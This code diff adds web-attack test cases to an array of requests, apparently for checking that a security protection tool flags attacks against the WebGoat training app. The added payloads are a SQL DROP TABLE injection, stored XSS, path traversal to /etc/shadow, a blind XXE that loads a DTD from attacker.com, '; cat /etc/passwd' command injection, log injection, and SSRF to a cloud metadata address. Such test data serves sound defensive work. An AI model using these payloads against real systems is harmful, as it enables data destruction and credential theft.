@@ -70,6 +70,14 @@ const attacks = [
     },
   },
   {
+    id: "sqli-stacked",
+    rule: "SQL Injection",
+    label: "SQLi - stacked query (DROP attempt in action_string)",
+    method: "POST",
+    path: "/SqlInjection/attack10",
+    form: { action_string: "'; DROP TABLE access_log; --" },
+  },
+  {
     id: "xss-reflected",
     rule: "Cross-Site Scripting",
     label: "Reflected XSS - <script> in a reflected field",
@@ -85,6 +93,15 @@ const attacks = [
     },
   },
   {
+    id: "xss-stored",
+    rule: "Cross-Site Scripting",
+    label: "Stored XSS - <img onerror> in comment",
+    method: "POST",
+    path: "/CrossSiteScriptingStored/stored-xss",
+    body: '{"text":"<img src=x onerror=alert(1)>"}',
+    contentType: "application/json",
+  },
+  {
     id: "path-traversal",
     rule: "Path Traversal",
     label: "Path traversal - ../ sequence in file id",
@@ -93,17 +110,66 @@ const attacks = [
     params: { id: "../../../../etc/passwd" },
   },
   {
+    id: "path-traversal-upload",
+    rule: "Path Traversal",
+    label: "Path traversal - ../ in profile fullName",
+    method: "POST",
+    path: "/PathTraversal/profile-upload",
+    form: { fullName: "../../../etc/shadow" },
+  },
+  {
     id: "xxe",
     rule: "XML External Entity (XXE)",
     label: "XXE - external entity declaration in XML body",
     method: "POST",
     path: "/xxe/simple",
-    // Canonical XXE detection vector; entity points at an innocuous file so nothing
-    // sensitive is read. Protect flags the external-entity declaration itself.
     body:
       '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/hostname">]>' +
       "<comment><text>&x;</text></comment>",
     contentType: "application/xml",
+  },
+  {
+    id: "xxe-blind",
+    rule: "XML External Entity (XXE)",
+    label: "XXE - blind OOB entity in XML body",
+    method: "POST",
+    path: "/xxe/blind",
+    body:
+      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>' +
+      "<comment><text>blind</text></comment>",
+    contentType: "application/xml",
+  },
+  {
+    id: "cmd-injection",
+    rule: "Command Injection",
+    label: "CMDi - semicolon command separator in network param",
+    method: "POST",
+    path: "/PathTraversal/random",
+    form: { secret: "; cat /etc/passwd" },
+  },
+  {
+    id: "log-injection",
+    rule: "Log Injection",
+    label: "Log injection - newline + fake log entry in username",
+    method: "POST",
+    path: "/InsecureLogin/task",
+    form: { username: "admin\nINFO: Login succeeded for admin", password: "test" },
+  },
+  {
+    id: "ssrf",
+    rule: "SSRF",
+    label: "SSRF - internal IP in URL param",
+    method: "POST",
+    path: "/SSRF/task2",
+    form: { url: "http://169.254.169.254/latest/meta-data/" },
+  },
+  {
+    id: "deserialization",
+    rule: "Untrusted Deserialization",
+    label: "Deserialization - crafted serialized object token",
+    method: "POST",
+    path: "/InsecureDeserialization/task",
+    form: { token: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXQABHRlc3R4" },
   },
 ];
 
